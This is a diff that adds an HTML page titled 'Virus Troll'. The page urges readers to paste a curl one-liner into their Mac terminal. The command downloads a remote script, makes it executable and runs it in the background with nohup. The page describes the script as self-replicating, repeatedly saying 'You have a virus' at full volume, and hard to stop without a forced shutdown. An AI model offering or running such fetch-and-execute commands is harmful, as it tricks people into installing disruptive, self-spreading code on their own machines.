@@ -1,0 +1,22 @@
+<html>
+  <head>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+    <style>
+      body{
+        font-family: 'Open Sans', sans-serif;
+        text-align:center;
+      }
+    </style>
+    <title>Virus Troll</title>
+  </head>
+  <body>
+    <div>
+      <h1>Virus Troll</h1>
+      <p>This script trolls people by making their computer say "You have a virus" at max volume, and it self-replicates.<br />
+      The only way to end it is to force shutdown the computer, or to somehow use Terminal to <i>killall sh</i>.</p>
+      Copy and paste the following into your terminal:
+      <code>curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl" -o "trolling"; tr -d '\r' < trolling >trollingnl; chmod +x ./trollingnl; rm -rf trolling; nohup sh -c '$PWD/trollingnl' &</code>
+      For more information, click <a href="more.html">here</a>.
+    </div>
+  </body>
+</html>
